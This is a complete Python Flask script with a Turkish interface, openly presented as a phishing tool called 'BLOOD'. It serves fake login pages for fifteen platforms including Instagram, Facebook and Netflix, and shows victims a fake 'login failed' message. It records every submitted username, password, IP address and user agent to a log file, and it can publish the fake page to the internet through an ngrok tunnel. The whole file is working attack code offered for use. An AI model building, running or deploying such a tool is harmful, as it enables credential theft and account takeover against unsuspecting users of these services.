import os
import time
import datetime
import threading
import requests
from flask import Flask, request, send_file
from termcolor import cprint

app = Flask(__name__)
selected_platform = ""
log_file = "log.txt"
ngrok_url = None

PLATFORMS = {
    "1": "instagram",
    "2": "facebook",
    "3": "tiktok",
    "4": "roblox",
    "5": "snapchat",
    "6": "mediafire",
    "7": "github",
    "8": "twitter",
    "9": "linkedin",
    "10": "pinterest",
    "11": "tumblr",
    "12": "whatsapp",
    "13": "discord",
    "14": "youtube",
    "15": "netflix"
}

def banner():
    os.system("clear")
    cprint(r"""
  ____  _                  _ 
 | __ )| | ___   ___  _ __| |
 |  _ \| |/ _ \ / _ \| '__| |
 | |_) | | (_) | (_) | |__| |
 |____/|_|\___/ \___/|______|

""", "red", attrs=["bold"])
    cprint("🩸 BLOOD - Phishing Aracı (Gelişmiş CLI)", "red", attrs=["bold"])
    cprint("         Geliştirici: Sen", "red")
    cprint("==========================================\n", "red")

def show_menu():
    cprint("📱 Desteklenen Platformlar:", "cyan", attrs=["bold"])
    for key in sorted(PLATFORMS.keys(), key=int):
        cprint(f"[{key}] {PLATFORMS[key].capitalize()}", "yellow")
    cprint("[0] Çıkış\n", "yellow")
    choice = input("Platform seç (0-15): ")
    return PLATFORMS.get(choice, None)

def write_log(data):
    with open(log_file, "a") as f:
        f.write(data + "\n")

def phishing_page():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        ip = request.remote_addr
        ua = request.headers.get("User-Agent")
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        log_data = f"{timestamp} | {selected_platform.upper()} | IP: {ip} | UA: {ua} | {username}:{password}"
        write_log(log_data)
        cprint(f"[!] Yeni giriş yakalandı! {username}:{password} IP: {ip}", "green")

        return "⚠️ Giriş başarısız. Lütfen tekrar deneyin."
    return send_file(f"sites/{selected_platform}.html")

@app.route("/", methods=["GET", "POST"])
def index():
    return phishing_page()

def start_ngrok(port):
    global ngrok_url
    cprint("[*] Ngrok başlatılıyor...", "magenta")
    os.system(f"pkill ngrok")  # var ise eskiyi kapat
    os.system(f"nohup ngrok http {port} > /dev/null 2>&1 &")
    time.sleep(7)
    try:
        url = requests.get("http://127.0.0.1:4040/api/tunnels").json()['tunnels'][0]['public_url']
        ngrok_url = url
        cprint(f"[✓] Ngrok URL: {url}", "magenta")
    except Exception as e:
        cprint(f"[X] Ngrok URL alınamadı: {e}", "red")

def start_tool():
    global selected_platform, ngrok_url

    banner()
    platform = show_menu()

    if not platform:
        cprint("👋 Çıkış yapılıyor...", "yellow")
        exit()

    selected_platform = platform
    port = input("📡 Port numarası (örnek 8080): ")

    confirm = input(f"\n⚠️ {selected_platform.upper()} sahte sayfası {port} portunda başlatılacak. Emin misin? (e/h): ")
    if confirm.lower() != 'e':
        cprint("❌ İşlem iptal edildi.", "red")
        exit()

    use_ngrok = input("🌐 Ngrok ile dışa açmak ister misin? (e/h): ").lower()
    if use_ngrok == "e":
        threading.Thread(target=start_ngrok, args=(port,), daemon=True).start()

    cprint(f"\n🚀 Başlatılıyor... http://localhost:{port}", "green")
    if ngrok_url:
        cprint(f"🌍 İnternetten erişim için: {ngrok_url}", "green")

    cprint("🔍 Termux'ta durdurmak için: CTRL + C\n", "yellow")

    app.run(host="0.0.0.0", port=int(port))

if __name__ == "__main__":
    start_tool()
